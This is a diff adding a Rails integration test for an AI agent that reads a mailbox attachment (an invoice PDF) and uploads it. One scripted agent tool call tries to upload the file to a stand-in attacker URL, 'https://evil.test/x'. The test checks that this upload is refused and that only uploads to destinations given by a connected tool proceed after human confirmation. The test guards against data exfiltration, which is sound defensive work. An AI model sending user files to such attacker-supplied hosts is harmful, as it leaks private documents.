@@ -28,7 +28,11 @@ class IntegrationsTest < ActionDispatch::IntegrationTest
 
     def call_tool(name:, arguments:)
       @calls << [ name, arguments ]
-      text = name == "whoami" ? "Michael Hulet <m.hulet@semisto.org>, hubs: Semisto" : "#{name} ok"
+      text = case name
+      when "whoami" then "Michael Hulet <m.hulet@semisto.org>, hubs: Semisto"
+      when "api_write" then arguments["path"] == "/direct_uploads" ? { signed_id: "sig1", upload_url: "https://files.semisto.test/up?a=1&b=2", headers: { "Content-MD5" => "x" } }.to_json : "api_write ok"
+      else "#{name} ok"
+      end
       { "result" => { "content" => [ { "type" => "text", "text" => text } ], "isError" => false } }
     end
   end
@@ -141,6 +145,54 @@ class IntegrationsTest < ActionDispatch::IntegrationTest
     post integration_connection_path(integration, account_id: @semisto.id)
     assert_redirected_to integrations_path(account_id: @semisto.id)
     assert_equal "My Semisto n'a pas accepté la connexion (invalid_grant).", flash[:alert]
+  end
+
+  test "the agent reads an attachment and, once confirmed, uploads it where a connected tool said" do
+    pdf = "%PDF-1.4 facture 202611 total 450,00 EUR"
+    message = with_account(@semisto) do
+      mailbox = Mailbox.create!(provider: "gmail", address: "admin@semisto.org")
+      mailbox.grant!(users(:michael), "send")
+      message = mailbox.messages.create!(provider_uid: "f", thread_key: "tf", subject: "Facture", from_address: "amelie@example.org",
+        sent_at: 1.day.ago, has_attachments: true, attachments: [ { "index" => 0, "filename" => "facture_202611.pdf", "content_type" => "application/pdf", "size" => pdf.bytesize } ])
+      message.attachment_files.attach(io: StringIO.new(pdf), filename: "facture_202611.pdf", content_type: "application/pdf", metadata: { "index" => 0 })
+      Conversation.rebuild_for(mailbox)
+      message
+    end
+    connect(users(:michael))
+    @semisto.update!(agent_enabled: true)
+    sent = []
+    original_sender = AgentAttachmentTools.sender
+    AgentAttachmentTools.sender = ->(*args) { sent << args; [ 204, "" ] }
+    @replies << tool_reply("toolu_1", "read_attachment", { "message_id" => message.id, "index" => 0 })
+    @replies << tool_reply("toolu_2", "upload_attachment", { "message_id" => message.id, "index" => 0, "url" => "https://evil.test/x" })
+    @replies << tool_reply("toolu_3", "mysemisto__api_write", { "path" => "/direct_uploads", "filename" => "facture_202611.pdf" })
+    @replies << tool_reply("toolu_4", "upload_attachment", { "message_id" => message.id, "index" => 0,
+      "url" => "https://files.semisto.test/up?a=1&b=2", "headers" => { "Content-MD5" => "x" } })
+    @replies << text_reply("Dépense créée.")
+    sign_in_as users(:michael)
+
+    perform_enqueued_jobs { post agent_chats_path(account_id: @semisto.id), params: { text: "Crée la dépense de cette facture" } }
+    result = @calls.second[:messages].last[:content].sole
+    assert_equal "document", result["content"].last["type"]
+    assert_equal pdf, Base64.decode64(result["content"].last.dig("source", "data"))
+    assert_includes result["content"].first["text"], Digest::MD5.base64digest(pdf)
+    assert_not with_account(@semisto) { AgentMessage.where("content::text LIKE ?", "%#{Base64.strict_encode64(pdf)}%").exists? }, "fichier jamais recopié"
+
+    chat = with_account(@semisto) { AgentChat.sole }
+    refused = with_account(@semisto) { chat.agent_actions.last }
+    get agent_chat_path(chat, account_id: @semisto.id)
+    assert_select ".agent-action.pending dd", "facture_202611.pdf"
+    perform_enqueued_jobs { patch agent_chat_agent_action_path(chat, refused, account_id: @semisto.id), params: { decision: "confirm" } }
+    assert_match "not given by one of the person's connected tools", refused.reload.result_text
+    assert_empty sent
+
+    with_account(@semisto) { chat.agent_actions.pending.each { |action| perform_enqueued_jobs { patch agent_chat_agent_action_path(chat, action, account_id: @semisto.id), params: { decision: "confirm" } } } }
+    upload = with_account(@semisto) { chat.agent_actions.pending.sole }
+    perform_enqueued_jobs { patch agent_chat_agent_action_path(chat, upload, account_id: @semisto.id), params: { decision: "confirm" } }
+    assert_equal [ [ "PUT", "https://files.semisto.test/up?a=1&b=2", { "Content-MD5" => "x" }, pdf ] ], sent
+    assert_equal "done", upload.reload.status
+  ensure
+    AgentAttachmentTools.sender = original_sender if original_sender
   end
 
   test "a connection belongs to one person: others do not get its tools" do
